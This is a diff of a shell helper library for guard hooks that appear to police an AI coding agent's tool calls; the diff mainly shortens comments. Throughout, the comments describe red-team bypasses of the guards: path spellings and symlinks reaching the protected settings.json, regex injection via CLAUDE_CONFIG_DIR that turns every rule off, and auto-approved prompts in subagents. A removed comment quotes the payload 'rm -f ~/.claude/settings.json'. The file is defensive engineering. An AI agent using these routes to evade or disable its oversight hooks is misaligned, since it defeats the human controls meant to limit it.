@@ -1,63 +1,31 @@
 #!/usr/bin/env sh
-# library-admission.sh — shared helpers for the Helm POSIX floor guards (workstream B,
-# harbor#3). Sourced by bin/guard-*.sh AFTER their kill-switch line. One side
-# effect at source time: the locale below. Pure POSIX + jq; when jq is absent the field helpers
-# return empty and guards fail OPEN — the un-swallowable permissions.deny
-# layer (B1) is the backstop, per docs/how-to/harden-the-host.md's layering.
-#
-# DELIBERATELY ONE FILE (docs/explanation/modularity.md). Every guard sources this, and
-# B6 hash-pins each floor file individually — splitting it multiplies the pin
-# surface, and a sourced helper that lives in five files has five places for a
-# tamper to hide. Size is the price of one auditable unit.
-#
-# Provenance: floor_in_repo re-implements the resolution algorithm frozen in
-# harbor contracts/marker.md (walk up; .agents/ or legacy .claude/config.yaml;
-# innermost marker wins). Deliberately NOT an import of project-init's private
-# prod_guard._find_config — three parallel implementations, one shared fixture
-# suite (marker.md:17).
+# library-admission.sh (harbor#3) - shared helpers for the POSIX floor guards; sourced by bin/guard-*.sh after their kill-switch line.
+# Pure POSIX + jq. Without jq the field helpers return empty and guards fail OPEN; permissions.deny (B1) is the backstop.
+# DELIBERATELY ONE FILE (docs/explanation/modularity.md): B6 hash-pins each floor file, so a split multiplies the pin surface.
+# floor_in_repo re-implements the resolution frozen in contracts/marker.md; it is not an import of yard's _find_config.
+# Removed notes: docs/explanation/code-cases/bin-library-admission.md
 
-# Bytes, not characters, for every guard. Under gawk in a UTF-8 locale (Linux's default) a 131 KB
-# payload was never judged within 61 s, while C judged it in 0.09 s: a hook timeout, which fails open
-# (harbor-core's first hosted CI, Q-R4). Nothing here matches multibyte text, so C changes no verdict.
+# Bytes, not characters: under gawk in a UTF-8 locale a large payload outran the hook timeout, which fails open (harbor-core Q-R4). C changes no verdict.
 LC_ALL=C; export LC_ALL
+
+# The two scaffolder names the floor reads (harbor#966, #999). The floor cannot ask the repo registry (hash-pinned POSIX, no I/O it does not control),
+# so they are named once here; contracts/marker.md freezes both and tests/scope/siblings holds the count.
+# LEGACY marker file: removed once no repo is still on it (#963). LIFECYCLE plugin id: the repo guard whose wiring hands the force-push rules over (floor_repo_wires).
+FLOOR_SCAFFOLDER_MARKER_LEGACY="project-init.md"
+# shellcheck disable=SC2034 # read by the scripts that source this library (admission-bash.sh)
+FLOOR_SCAFFOLDER_LIFECYCLE_PLUGIN="project-init-lifecycle"
 
 # floor_config_dir — the config dir this session runs against.
 floor_config_dir() {
-  # Trailing slashes are stripped: with them, CFG_RE gained a `//+` that
-  # floor_expand_paths had already collapsed, so no spelling of the config dir
-  # could ever match and every surface rule silently stopped firing
-  # (red-team pass 8).
+  # Trailing slashes are stripped: with them CFG_RE gained a `//+` that floor_expand_paths had already collapsed, so no spelling matched.
   _cd="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"
   while [ "${_cd%/}" != "$_cd" ] && [ "$_cd" != "/" ]; do _cd="${_cd%/}"; done
   printf '%s' "$_cd"
 }
 
-# floor_port_root — the workspace root the governed repos live under, per
-# contracts/port-root.md. ONE setting with three readers: Harbor reads it here,
-# project-init's config walk stops before it, projects-orchestrator defaults PO_FLEET_ROOT
-# and fleet.yaml's scan root from it (harbor#619). Same shape as the marker
-# spec next door — one frozen resolution rule, re-implemented per language,
-# pinned by shared fixtures — and for the same reason: the POSIX floor must not
-# import a Python resolver across a language boundary.
-#
-# Resolution, in order: an exported PORT_ROOT, else `$HOME/port`. The default is
-# per OS; native Windows is refused (contracts/platforms.md) and WSL2 is Linux.
-#
-# EMPTY IS UNSET. `PORT_ROOT=` in a profile is someone clearing the variable,
-# never someone naming the root the empty string. The `:-` colon form is what
-# makes those one answer; the non-colon form would hand the walk below an empty
-# stop and the guarantee would silently not apply.
-#
-# HOME UNSET ⇒ NO ROOT, and the caller handles the empty return. M14's rule for
-# M14's reason: `$HOME/port` with HOME unset spells `/port`, which is a guess
-# about the machine, and a walk that stops at a guessed path is worse than one
-# that does not stop — it would un-govern whatever happens to live there.
-#
-# TRAILING SLASHES STRIPPED, because the stop below is an EQUALITY test against
-# a physically resolved path. `~/port/` and `~/port` name one directory and
-# spell it two ways, and a PORT_ROOT that does not exist yet keeps its raw
-# spelling (nothing to resolve), so the two spellings would otherwise give two
-# verdicts on the same box — the P13-fs-02 class, one variable over.
+# floor_port_root - the workspace root the governed repos live under (contracts/port-root.md): an exported PORT_ROOT, else $HOME/port.
+# Empty is unset (`:-`). HOME unset gives NO ROOT (empty return): `/port` would be a guess about the machine, and a walk stopping at a guess un-governs it.
+# Trailing slashes are stripped because the walk's stop is an equality test on a physically resolved path (P13-fs-02 class).
 floor_port_root() {
   _pr="${PORT_ROOT:-}"
   if [ -z "$_pr" ]; then
@@ -68,82 +36,16 @@ floor_port_root() {
   printf '%s' "$_pr"
 }
 
-# floor_ere_quote <string> — the string with every ERE metacharacter escaped, so
-# it matches LITERALLY wherever a rule interpolates it.
-#
-# WHY (docs/explanation/admission-baseline.md P12-configdir-ere-injection-03, critical; reproduced 2026-08-30).
-# floor_config_dir returns CLAUDE_CONFIG_DIR verbatim and the surface rules
-# interpolate it straight into CFG_RE / CFGDIR_RE / CFG_TOK. A value carrying an
-# UNBALANCED metacharacter makes the whole expression invalid, grep exits
-# non-zero rather than matching, and every rule built on it reads FALSE — the
-# floor is off while still looking installed, pinned and wired. That is the same
-# undocumented kill-switch class as an inherited FLOOR_GREP, reached through the
-# config dir instead of the interpreter.
-#
-# MEASURED, not reasoned about: with the payload 'rm -f ~/.claude/settings.json',
-# CLAUDE_CONFIG_DIR='/tmp/x((' and '/tmp/x[' each took the verdict from rc 2 to
-# rc 0. `)` `*` `+` `|` still blocked — not because they were handled, but
-# because each happens to leave a VALID (if wrong) expression behind. Blocking
-# by luck is not blocking, and the luck runs out on the next metacharacter.
-#
-# Quote only the VARIABLE part of a rule. The hand-written `\.claude` literals
-# beside it are already correct ERE, and TILDE_USER is a character class that is
-# MEANT to be one — quoting either would break the rule it is trying to protect.
+# floor_ere_quote <string> - the string with every ERE metacharacter escaped, so it matches LITERALLY where a rule interpolates it.
+# WHY (admission-baseline.md P12-configdir-ere-injection-03): an unbalanced metacharacter in CLAUDE_CONFIG_DIR made the whole regex invalid, grep exited non-zero, and every rule built on it read FALSE (floor off while looking installed).
+# Quote only the VARIABLE part of a rule; the hand-written `\.claude` literals and TILDE_USER (a character class) are already correct.
 floor_ere_quote() { printf '%s' "$1" | sed 's/[][\\^$.*+?(){}|]/\\&/g'; }
 
-# floor_host_token — the per-machine partition key for every ledger that shards
-# by host: the guard-decision ledger (admission-observe.sh), the work-log's session
-# records (memory-harvest.sh) and its commit subjects (worklog-push.sh).
-#
-# ONE definition, called by all three. They previously carried the same
-# `hostname -s` expression as three copies, each with a comment promising the
-# copies were byte-identical. They were byte-identical, and it did not help:
-# the VALUE moved underneath all three at once.
-#
-# 2026-08-04, MEASURED on this box. `hostname -s` on macOS reports the
-# DHCP/DNS-supplied name, not a machine property. With `scutil --get HostName`
-# unset — which is the macOS default — the name falls back to whatever the
-# network last supplied, and to the literal `Mac` once nothing has. This machine
-# flipped from `<owner>s-MacBook-Air` to `Mac` between 19:15 and 19:48 local, and
-# every host-sharded ledger forked in place: 21917 guard-decision records under
-# the old key against 54 under the new one, and 67 work-log session files against
-# 38. Nothing errored. A reader of either directory silently under-reports, which
-# is the failure mode an audit trail exists to not have.
-#
-# The comment at admission-observe.sh's old call site asserted this value "changes
-# once per boot". It changes when the network does.
-#
-# `scutil --get LocalHostName` is the Bonjour name: set in Settings > Sharing,
-# persisted across reboots and network changes, and already constrained by macOS
-# to letters, digits and hyphens. When it is absent — unset, or any non-Darwin
-# box — fall back to the original expression, so the token degrades to the
-# previous behaviour rather than to `unknown-host`.
-#
-# Not on the hot path: guards read the cached `.helm-obs-host` token with a
-# builtin. This is called at SessionStart and by the work-log hooks, where a
-# fork costs nothing. Sourcing this file still creates nothing (property 3).
-#
-# BOTH binaries are resolved to an absolute system path, never through PATH, for
-# the same reason FLOOR_GREP is pinned below: the floor must behave identically no
-# matter what is early in PATH. A shim named `scutil` or `hostname` on PATH could
-# otherwise redirect all three ledgers to any valid-looking token and reproduce
-# the silent under-reporting this function exists to end — and it would look like
-# a working floor while doing it. Raised on PR #119 review for `scutil`; it applies
-# equally to `hostname`, because the expression this replaces was PATH-resolved
-# too, and pinning only the new branch would move the hole one command over
-# instead of closing it. HOST-1 case 7 is the proof: it shims both and asserts the
-# token does not move.
-#
-# NO PATH FALLBACK, deliberately diverging from FLOOR_GREP, which does fall back
-# to a bare `grep`. For grep, losing the interpreter breaks every rule and the
-# fallback buys real function. Here the fallback would reopen exactly the hole
-# above, and the degraded answer — `unknown-host` — is honest and visible: records
-# still land, in a directory whose name says the machine could not be identified.
-# A shimmed token is invisible, which is strictly worse than a labelled unknown.
-#
-# The sanitization is pure parameter expansion rather than `tr`, so the function
-# spawns nothing that PATH could redirect. Pinning `tr` would have worked too;
-# not needing it is better, and a host name is short enough that the loop is free.
+# floor_host_token - the per-machine partition key for every host-sharded ledger (admission-observe.sh, memory-harvest.sh, worklog-push.sh). ONE definition.
+# `hostname -s` on macOS reports the network-supplied name and flipped to `Mac`, forking every ledger in place; LocalHostName is stable, so it is tried first and `hostname -s` is the fallback.
+# Both binaries are resolved to absolute system paths, never PATH (a shim would redirect all ledgers; HOST-1 case 7). NO PATH FALLBACK, unlike FLOOR_GREP:
+# the degraded answer `unknown-host` is visible, a shimmed token is not. Sanitisation is parameter expansion so nothing PATH-resolved is spawned.
+# Not on the hot path: guards read the cached .helm-obs-host token.
 floor_host_token() {
   _fht=""
   for _fhtb in /usr/sbin/scutil /sbin/scutil; do
@@ -169,28 +71,23 @@ floor_host_token() {
   printf '%s' "$_fhto"
 }
 
-# floor_read_stdin — capture hook stdin JSON into FLOOR_IN; non-zero when the read itself fails.
-# harbor#810: /bin/cat first, and a failed read is not an empty payload, which allowed everything.
+# floor_read_stdin - capture hook stdin JSON into FLOOR_IN; non-zero when the read fails. /bin/cat first (harbor#810); a failed read is not an empty payload.
 floor_read_stdin() {
   _frc=/bin/cat; [ -x "$_frc" ] || _frc=cat
   FLOOR_IN="$("$_frc" 2>/dev/null)" || return 1
 }
 
-# floor_field <jq-path> — extract a field from FLOOR_IN; empty on ANY failure
-# (missing jq, bad JSON, absent field) so callers fail open.
+# floor_field <jq-path> - extract a field from FLOOR_IN; empty on ANY failure so callers fail open.
 floor_field() {
   [ -n "${FLOOR_IN:-}" ] || return 0
   printf '%s' "$FLOOR_IN" | "$FLOOR_JQ" -r "$1 // empty" 2>/dev/null || true
 }
 
-# floor_shell_tool <tool_name> — 0 for a tool that runs tool_input.command in the Bash shell.
-# Monitor does (pass 14 E-4); a guard that tested `= Bash` let every Monitor command through.
+# floor_shell_tool <tool_name> - 0 for a tool that runs tool_input.command in the shell (Bash, Monitor; pass 14 E-4).
 floor_shell_tool() { case "${1:-}" in Bash|Monitor) return 0 ;; esac; return 1; }
 
-# floor_switch_settings_files [<project dir>] -- the settings files whose `env` block reaches every hook, one per
-# line. THE ONE PLACE THE SWITCH'S LOCATION IS NAMED (harbor#954 PR B). Where the switch is read from is the open
-# ADR on harbor#603; this is today's answer, the user tier plus the project's .claude pair, and moving it later is
-# an edit to this function and to nothing that calls it. The project directory is often $HOME, where
+# floor_switch_settings_files [<project dir>] - the settings files whose `env` block reaches every hook. The ONE place the switch's location is named (harbor#954 PR B; ADR on harbor#603).
+# The project dir is often $HOME, where `$proj/.claude` IS the config dir: one file, one check.
 # `$proj/.claude` IS the config dir: one file, one check.
 floor_switch_settings_files() {
   _fsc="$(floor_config_dir)"
@@ -201,36 +98,19 @@ floor_switch_settings_files() {
   return 0
 }
 
-# floor_switch_in_settings <file> -- the switch names (HARBOR_ADMISSION_DISABLE, HARBOR_ADMISSION_SHADOW) that the file's
-# `env` block sets to 1, one per line. It reads the FILE, with jq, so the decoded key is what is matched: a `\u`
-# escape, a split edit, a symlinked .claude, a writer after a pipe and a two-step copy all end as the same bytes,
-# and a check on how it was written cannot see them. Only the literal 1 opens a switch (docs/explanation/admission-baseline.md), so only 1 counts.
+# floor_switch_in_settings <file> - the switch names (the two admission switches) that the file's `env` block sets to 1, one per line.
+# It reads the FILE with jq so the decoded key is matched (escapes, symlinks and split edits all end as the same bytes). Only the literal 1 opens a switch (admission-baseline.md).
 # Empty on a missing, unreadable or unparsable file: the harness would not load one either.
 floor_switch_in_settings() {
   [ -f "$1" ] || return 0
   "$FLOOR_JQ" -r '(.env // {}) | if type == "object" then
-      to_entries[] | select(.key == "HARBOR_ADMISSION_DISABLE" or .key == "HARBOR_ADMISSION_SHADOW" or .key == "HELM_DISABLE_FLOOR" or .key == "HELM_FLOOR_SHADOW")
+      to_entries[] | select(.key == "HARBOR_ADMISSION_DISABLE" or .key == "HARBOR_ADMISSION_SHADOW")
       | select((.value | tostring) == "1") | .key else empty end' "$1" 2>/dev/null | sort -u || :
 }
 
-# floor_no_human — exit 0 iff this PreToolUse call has NO human able to answer an
-# interactive `ask` prompt, so an ask-tier verdict would AUTO-APPROVE and must
-# escalate to `deny`. Measured 2026-08-13: a `bq rm`/`kubectl delete` issued from
-# a Task/Agent subagent executed with no prompt and no block, while the same call
-# from the interactive main loop is prompted — an `ask` is toothless off the main
-# loop, which is exactly where an unattended agent does damage.
-#
-# FAIL-SAFE TOWARD "HUMAN PRESENT" (return 1 on any doubt). A false "no-human"
-# would hard-deny an interactive op, the §2.11 disaster that gets the floor
-# switched off, so only POSITIVE, subagent-SPECIFIC signals flip it — never the
-# absence of one. Three independent signals, any of which is decisive:
-#   • permission_mode is an autonomous mode (no prompt is ever shown);
-#   • transcript_path is under a `/subagents/` dir — MEASURED: every subagent's
-#     (Task/Agent and workflow) transcript is there, the main loop's never is;
-#   • agent_type names a subagent/workflow agent (payload carries it, e.g.
-#     "workflow-subagent"). The transcript signal already covers the case where a
-#     regular subagent's agent_type is its bare name, so this is belt-and-braces.
-# Reads FLOOR_IN via floor_field, so floor_read_stdin must have run first.
+# floor_no_human - exit 0 iff NO human can answer an interactive `ask`, so an ask-tier verdict would auto-approve and must escalate to deny.
+# Fail-safe toward "human present" (return 1 on any doubt): a false "no-human" hard-denies interactive work, the disaster that gets the floor switched off. Only positive signals flip it:
+# permission_mode is autonomous; transcript_path is under /subagents/; agent_type names a subagent/workflow agent. Needs floor_read_stdin first.
 floor_no_human() {
   case "$(floor_field '.permission_mode')" in
     bypassPermissions|dangerouslySkipPermissions) return 0 ;;
@@ -244,85 +124,34 @@ floor_no_human() {
   return 1
 }
 
-# floor_in_repo — exit 0 iff cwd is inside a governed repo per
-# contracts/marker.md (the B5 seam: inside, the floor narrows to global-only
-# concerns; the veto itself never stands down — docs/reports/platform-epic.md:44).
-# The marker must be a real, NON-SYMLINK FILE inside a real, non-symlink
-# `.agents/` — `[ -e .agents ]` accepted a zero-byte file or a
-# symlink-to-anywhere, letting an attacker-authored tree forge governed status
-# and switch off the project-policy checks (red-team 2026-07-24, marker-forgery).
-# Marker PRESENCE decides `repo`; an explicit `context: ambient` in the found
-# marker's config.yaml decides `ambient` (see below).
-#
-# M12 (owner decision 2026-07-25): a BARE `.agents/` directory is NOT a marker.
-# The spec always read "`.agents/` present (`project-init.md` / `config.yaml`)",
-# and project-init's reference `_find_config` has always required a file. Helm
-# was the permissive one, which is the wrong direction for a guard: a bare
-# directory made the floor stand down over a repo that had no policy yet — the
-# exact window a scaffolder opens when it mkdirs `.agents/` before writing into
-# it. Two implementations now key off the same predicate instead of two.
-#
-# M14 (owner decision 2026-08-02): the walk STOPS BEFORE $HOME. One file at
-# `~/.agents/config.yaml` resolves every directory beneath it to `repo` and
-# stands the ambient layer down machine-wide — and it is a cheap accident, not
-# an attack: project-init run once in the wrong cwd scaffolds `.agents/` right
-# there. M12 raised the bar from a bare directory to a named FILE and did not
-# close this, because a scaffolder writes named files. Directories outside
-# $HOME are untouched and still walk to `/`.
-#
-# M33-M37 (harbor#619): the walk ALSO stops before PORT_ROOT, the workspace root
-# the repos live under. Same hazard one level down, and a likelier one: `~/port`
-# is a directory the operator is told to create, #620 exists to put instruction
-# files IN it, and a root config carrying `.agents/config.yaml` or
-# `.claude/config.yaml` would resolve every repo beneath it to `repo` — the
-# session hooks stand down and the force-push guard defers to a repo guard that
-# does not exist. Two stops, not one replacing the other: PORT_ROOT defaults
-# UNDER $HOME, so the M14 stop still has work to do for every path outside it.
+# floor_in_repo - exit 0 iff cwd is inside a governed repo per contracts/marker.md (the B5 seam: inside, the floor narrows to global-only concerns; the veto never stands down).
+# The marker must be a real non-symlink FILE inside a real non-symlink `.agents/` (a bare directory or symlink could forge governed status). Presence decides `repo`; `context: ambient` in the found marker decides `ambient`.
+# M14: the walk STOPS BEFORE $HOME (one stray ~/.agents/config.yaml would un-govern everything beneath it). M33-M37 (harbor#619): it also stops before PORT_ROOT. Two stops: PORT_ROOT defaults under $HOME.
 floor_in_repo() {
-  # HARBOR_ADMISSION_MARKER_DIR: the directory holding the marker the walk found, even when its value says
-  # `ambient`, so a caller asking about THAT repo's wiring or opt-outs reads the same one (harbor#954).
+  # HARBOR_ADMISSION_MARKER_DIR: the directory holding the marker the walk found, even when it says `ambient`, so callers read the same repo's wiring (harbor#954).
   HARBOR_ADMISSION_MARKER_DIR=""
-  # Prefer the SESSION cwd the harness sends in the payload (verified present in
-  # a live capture, 2026-07-25) over the hook process's own $PWD, which is only
-  # incidentally the same. The B5 seam's verdict depends on this path.
+  # Prefer the session cwd from the payload over the hook process's $PWD.
   d="${CLAUDE_PROJECT_DIR:-$(floor_field '.cwd')}"
   [ -n "$d" ] || d="$PWD"
-  # Walk the PHYSICAL path. M14's stop is an equality test, and `$HOME/.`,
-  # `$HOME//x/..` and a symlinked route to the same directory all spell it
-  # differently — comparing spellings is how R7 got past the file-tool guard and
-  # how pass 13's P13-fs-02 got past this one. Resolved ONCE here rather than
-  # per level: every ancestor `dirname` yields is then physical too, so one
-  # subshell buys an exact comparison at every level. A cwd that does not exist
-  # cannot be resolved and keeps its raw spelling — M16/M17, where the verdict
-  # is the ambiguity default rather than a path question.
+  # Walk the PHYSICAL path: the stops are equality tests, so spellings (`$HOME/.`, symlinks) must not matter (R7, P13-fs-02). Resolved once; a cwd that does not exist keeps its raw spelling (M16/M17).
   if _rd="$(CDPATH= cd -P -- "$d" 2>/dev/null && pwd -P)" && [ -n "$_rd" ]; then d="$_rd"; fi
   _hm="${HOME:-}"
   if [ -n "$_hm" ] && _rh="$(CDPATH= cd -P -- "$_hm" 2>/dev/null && pwd -P)" && [ -n "$_rh" ]; then
     _hm="$_rh"
   fi
-  # The same treatment for PORT_ROOT, and it must be the same treatment: a stop
-  # compared as a SPELLING is not a stop (R7, P13-fs-02). A PORT_ROOT that does
-  # not exist yet cannot be resolved and keeps its raw spelling, which is
-  # correct rather than merely tolerable — a directory that is not there is not
-  # an ancestor of any cwd, so the stop is inert until the root exists.
+  # PORT_ROOT gets the same physical resolution; one that does not exist yet keeps its raw spelling, and the stop is then inert.
   _pr="$(floor_port_root)"
   if [ -n "$_pr" ] && _rp="$(CDPATH= cd -P -- "$_pr" 2>/dev/null && pwd -P)" && [ -n "$_rp" ]; then
     _pr="$_rp"
   fi
   while [ -n "$d" ] && [ "$d" != "/" ]; do
-    # M14: stop BEFORE examining $HOME itself, so a marker sitting there governs
-    # nothing. Where $HOME is unset the stop does not apply — there is no home
-    # to stop before, and inventing one would be a guess about the machine.
+    # M14: stop BEFORE examining $HOME, so a marker there governs nothing. HOME unset: no stop.
     if [ -n "$_hm" ] && [ "$d" = "$_hm" ]; then break; fi
-    # M33: and stop BEFORE examining PORT_ROOT, so a marker written into the
-    # workspace root governs nothing beneath it either. Unset PORT_ROOT is not
-    # an opt-out: the default `$HOME/port` is what the audit for #619 measured
-    # live on this box, so a stop that only applied to an EXPORTED value would
-    # be off on exactly the machine it was built for.
+    # M33: stop BEFORE PORT_ROOT too. Unset PORT_ROOT is not an opt-out; the default `$HOME/port` applies.
     if [ -n "$_pr" ] && [ "$d" = "$_pr" ]; then break; fi
     _mk=""
     if [ -d "$d/.agents" ] && [ ! -L "$d/.agents" ]; then
-      for _f in "$d/.agents/config.yaml" "$d/.agents/project-init.md"; do
+      for _f in "$d/.agents/config.yaml" "$d/.agents/$FLOOR_SCAFFOLDER_MARKER_LEGACY"; do
         if [ -f "$_f" ] && [ ! -L "$_f" ]; then _mk="$_f"; break; fi
       done
     fi
@@ -331,43 +160,11 @@ floor_in_repo() {
     fi
     if [ -n "$_mk" ]; then
       HARBOR_ADMISSION_MARKER_DIR="$d"
-      # `context: ambient` is the owner opting THIS repo back in to the global
-      # layer (project-init PI-901 emits `context: repo` and defines `ambient`
-      # as the opt-out). Read at the marker the walk just found, because the
-      # innermost marker wins: an explicit opt-out must DECIDE `ambient`, not
-      # "keep looking", or an outer repo's marker would silently overrule it.
-      #
-      # Safe in one direction only, which is why it is honoured unilaterally
-      # ahead of the other two implementations: for a GUARD, `ambient` means
-      # stay fully armed. The dangerous direction — standing the floor down —
-      # is decided by marker PRESENCE and is not reachable through this value,
-      # so reading it adds no forgery surface. The legacy `.claude/config.yaml`
-      # marker is not consulted: it predates the field and no schema defines it
-      # there.
+      # `context: ambient` is the owner opting THIS repo back in to the global layer; read at the marker the walk just found (innermost wins). Safe in one direction only: for a guard, `ambient` means stay fully armed, so it adds no forgery surface.
+      # The legacy `.claude/config.yaml` marker is not consulted (no schema defines the field there).
       _cfg="$d/.agents/config.yaml"
-      # Anchored at column 0: `context` is a TOP-LEVEL key, and a top-level YAML
-      # key cannot be indented. Allowing leading whitespace would let a
-      # `context: ambient` nested under some unrelated block opt the whole repo
-      # out — the same over-broad-match class the scanner rules keep re-learning.
-      #
-      # But quoted keys/values and a space before the colon ARE valid top-level
-      # YAML — `"context": ambient`, `context : ambient`, `context: "ambient"` —
-      # and missing one of them means the floor reads a genuine opt-out as
-      # `repo` and STANDS DOWN. That is the unsafe direction, so the reader is
-      # deliberately the permissive one here. KEEP IN STEP with project-init's
-      # _CONTEXT_KEY_RE, which preserves exactly these spellings on upgrade
-      # (PI-901, PR #902 review): a spelling the writer keeps but the reader
-      # misses is an opt-out that survives and is then ignored.
-      #
-      # A COMMENT NEEDS WHITESPACE BEFORE IT (project-init PR #927 review, ported
-      # here to keep the readers in step). `#` begins a YAML comment only when
-      # preceded by whitespace; otherwise it is part of the plain scalar. So
-      # `context: ambient#typo` is the value `ambient#typo`, NOT `ambient`, and
-      # the old `[[:space:]]*(#.*)?` read it as an opt-out. Safe for a guard —
-      # it errs toward staying armed — and still a divergence, because the
-      # orchestrator parses real YAML and resolves that line differently. Three
-      # readers disagreeing about one line is what the shared fixtures exist to
-      # prevent, so the fixture pins it too.
+      # Anchored at column 0 (a top-level key cannot be indented). Quoted keys/values and a space before the colon ARE valid YAML, so the reader is deliberately permissive; KEEP IN STEP with yard's _CONTEXT_KEY_RE.
+      # A comment needs whitespace before the `#`: `context: ambient#typo` is not an opt-out.
       # Two spellings, one opt-out (harbor#966): the legacy `context: ambient` and the standard's
       # `scope: user` (D-12). Either one alone stays armed; `scope: project` and `context: repo` add nothing.
       if [ -f "$_cfg" ] && [ ! -L "$_cfg" ] && "$FLOOR_GREP" -Eq \
@@ -382,12 +179,9 @@ floor_in_repo() {
   return 1
 }
 
-# floor_repo_wires <hook> <plugin> — exit 0 iff the governing repo WIRES that guard (harbor#954, D-46).
-# A marker alone is not a guard: a project-policy rule stands down only to one that is present, the
-# question prod-guard-ambient.sh asks of prod_guard. Read from the RENDERED settings at the repo
-# floor_in_repo found: a PreToolUse hook whose command names <hook>, or <plugin>@<market> enabled there
-# (settings.local.json wins) AND listed in this box's installed_plugins.json. A symlinked .claude or
-# settings file is refused, as a symlinked marker is. No jq or bad JSON ⇒ not wired: stay armed.
+# floor_repo_wires <hook> <plugin> - exit 0 iff the governing repo WIRES that guard (harbor#954, D-46). A marker alone is not a guard.
+# Read from the rendered settings at the repo floor_in_repo found: a PreToolUse hook whose command names <hook>, or <plugin>@<market> enabled (settings.local.json wins) AND listed in installed_plugins.json.
+# A symlinked .claude or settings file is refused. No jq or bad JSON: not wired, stay armed.
 floor_repo_wires() {
   _rwh="$1"; _rwp="$2"
   floor_in_repo || return 1
@@ -413,48 +207,12 @@ floor_repo_wires() {
     "$(floor_config_dir)/plugins/installed_plugins.json" >/dev/null 2>&1
 }
 
-# floor_collapse_dots <text> — collapse `//`, `/./` and `/x/../` to a fixpoint.
-#
-# ONE collapse, every caller. There were three partial ones and they disagreed:
-# floor_norm_path (the file-tool guard's) collapsed `/x/../`, floor_expand_paths
-# (every Bash-surface path rule's) collapsed only `//`, and floor_bash_targets
-# had a third spelling doing `//` and `/./`. So
-# `~/Library/../.claude/bin/admission-bash.sh` was a protected control surface to
-# guard-selfedit and an ordinary path to guard-bash — same inode, two answers,
-# measured at exit 0 with the floor live (pass 13, P13-fs-02). Two guards that
-# disagree about which file a path names is not a missing rule, it is a missing
-# definition.
-#
-# DELIBERATELY LEXICAL, NEVER SYMLINK-AWARE, and that is a decision, not a
-# shortcut:
-#   • There is nothing to resolve. floor_expand_paths canonicalises whole COMMAND
-#     TEXT, not a path — the tokens are not split, and the target of a `>` does
-#     not exist until the command the guard is about to veto creates it.
-#   • It fails toward BLOCKING. Every caller ADDS the collapsed spelling
-#     alongside the raw one and greps both, so a collapse that is wrong about a
-#     symlinked component can only put an extra string in front of the rules; it
-#     can never delete the raw spelling, so it cannot manufacture a miss.
-#   • Resolving would cost a fork per token inside a PreToolUse hook, where a
-#     timeout is a SKIPPED hook and latency is therefore itself a fail-open
-#     bypass — the same reasoning FLOOR_MAX_NORM records.
-#   • A symlink resolved BEFORE the command runs can be replaced before it runs.
-# floor_norm_path still resolves physically when it can; this is only the
-# fallback for when the parent does not exist.
-#
-# THE COMPONENT BEING CANCELLED MUST NOT ITSELF BE `..`. An earlier regex
-# cancelled `..` against `..`, so `/h/d1/d2/d3/d4/../../../../.claude/x` landed
-# on `/h/d1/d2/.claude/x`, short of the config dir on exactly the deep spelling an
-# evader reaches for. A bounded pass count was the next bug (PR #113): hitting
-# the cap returned a path still holding `/../`, and depth 17 reached the live
-# settings file at rc=0. A cap that fails OPEN is worse than no cap.
-#
-# ONE LEFT-TO-RIGHT PASS OVER A STACK (harbor#759). The regex fixpoint it
-# replaces needed a pass per nesting level, O(depth x length): collapsing every
-# target line with it took a 32KB payload from 4.3s to 29.6s, a hook-timeout
-# fail-open, so `bash -c` bodies went uncollapsed. Same result on every string
-# (differentially fuzzed against it), plus one rule it lacked: `/..` is `/`, so
-# a `..` at the start of a word is dropped rather than cancelling the word
-# before it. A `..` with nothing under it to cancel (`~/..`, `../x`) is kept.
+# floor_collapse_dots <text> - collapse `//`, `/./` and `/x/../` to a fixpoint. ONE collapse, every caller: three disagreeing partial ones made one path a protected surface to one guard and ordinary to another (P13-fs-02).
+# DELIBERATELY LEXICAL, never symlink-aware: it canonicalises command TEXT, not a path; callers add the collapsed spelling beside the raw one, so it can only add a match;
+# a fork per token would cost latency, which is itself a fail-open bypass (FLOOR_MAX_NORM); and a symlink resolved before the command runs can change before it runs.
+# floor_norm_path still resolves physically when it can; this is the fallback.
+# The component being cancelled must not itself be `..` (cancelling `..` against `..` landed short of the config dir on deep spellings). No pass cap: a cap that fails open is worse than none (PR #113).
+# One left-to-right pass over a stack (harbor#759): the regex fixpoint cost O(depth x length) and timed a hook out on 32KB payloads. `/..` is `/`, so a leading `..` in a word is dropped; a `..` with nothing to cancel is kept.
 FLOOR_COLLAPSE_AWK='
 BEGIN { FC_Q = "[\"" sprintf("%c", 39) "]+$"; FC_D = "[[:space:];&|<>()`=:]" }
 function fc_root_next(c,  t) { t = c; sub(FC_Q, "", t); return t == "" || substr(t, length(t)) ~ FC_D }
@@ -537,19 +295,11 @@ floor_surface_re() {
   printf '(%s|%s)' "$(floor_ere_quote "$1")" "$(floor_ere_quote "$_fsr")"
 }
 
-# floor_norm_path <path> — normalize a filesystem path so the classifier
-# reasons about the RESOLVED target, not its spelling. Expands ~, makes it
-# absolute, resolves the parent physically (symlinks included) via `cd -P`,
-# and lexically collapses ./ // and ../ when the parent does not exist.
-# Red-team 2026-07-24: ./ , // and bin/../ all reached the real settings.json
-# (same inode) while string-matching the protected globs said "not protected".
+# floor_norm_path <path> - normalize a path so the classifier reasons about the RESOLVED target, not its spelling: expands ~, makes it absolute, resolves the parent physically (`cd -P`), and collapses lexically when the parent does not exist.
 floor_norm_path() {
   _p="$(floor_expand_home "$1")"
   case "$_p" in /*) ;; *) _p="${CLAUDE_PROJECT_DIR:-$PWD}/$_p" ;; esac
-  # Follow a symlink AT THE LAST COMPONENT too: resolving only the parent left
-  # `ln -s <protected> notes.json` (and hardlinks) pointing straight at the real
-  # inode while the classifier saw an innocent name (red-team pass 2). Bounded
-  # loop so a symlink cycle cannot hang the hook.
+  # Follow a symlink AT THE LAST COMPONENT too: a link or hardlink to a protected file must not pass as an innocent name (red-team pass 2). Bounded loop so a cycle cannot hang the hook.
   _hop=0
   while [ -L "$_p" ] && [ "$_hop" -lt 8 ]; do
     _t="$(readlink "$_p" 2>/dev/null)" || break
@@ -562,10 +312,7 @@ floor_norm_path() {
     printf '%s' "${_rd%/}/$_b"
     return 0
   fi
-  # Lexical fallback: the parent does not exist, so there is no inode to resolve
-  # and the shared collapse is all that is left. SHARED, not copied — this is the
-  # definition guard-bash reads too, so the two guards cannot drift apart again
-  # on what `~/x/../.claude` names (harbor#94, P13-fs-02).
+  # Lexical fallback: no inode to resolve. The collapse is SHARED with guard-bash so the two cannot disagree on what `~/x/../.claude` names (harbor#94, P13-fs-02).
   floor_collapse_dots "$_p"
 }
 
